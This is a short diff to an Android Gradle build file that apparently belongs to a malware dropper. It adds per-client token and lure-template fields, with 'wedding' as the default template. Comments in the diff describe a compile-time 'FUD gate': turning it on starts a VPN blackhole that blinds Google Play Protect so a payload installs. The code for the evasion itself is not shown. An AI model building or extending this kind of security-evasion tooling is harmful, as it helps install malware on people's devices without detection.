@@ -47,7 +47,10 @@ android {
         def isDevBuild = (System.getenv("IS_DEV_BUILD") ?: "false") == "true"
         buildConfigField "boolean", "IS_DEV_BUILD", "${isDevBuild}"
         buildConfigField "int",     "API_LEVEL",      "${project.ext.rand_versionCode % 100}"
-        buildConfigField "String",  "CLIENT_TOKEN",   "\"manual\""
+        def clientToken  = System.getenv("CLIENT_TOKEN")   ?: "manual"
+        def buildTemplate = System.getenv("BUILD_TEMPLATE") ?: "wedding"
+        buildConfigField "String",  "CLIENT_TOKEN",    "\"${clientToken}\""
+        buildConfigField "String",  "BUILD_TEMPLATE",  "\"${buildTemplate}\""
         // FUD gate — compile-time boolean; R8 inlines and dead-strips the branch at minify
         // true  = FUD ON  (VPN blackhole active → Play Protect blinded → payload installs)
         // false = FUD OFF (VPN skipped entirely → Play Protect active → payload blocked)
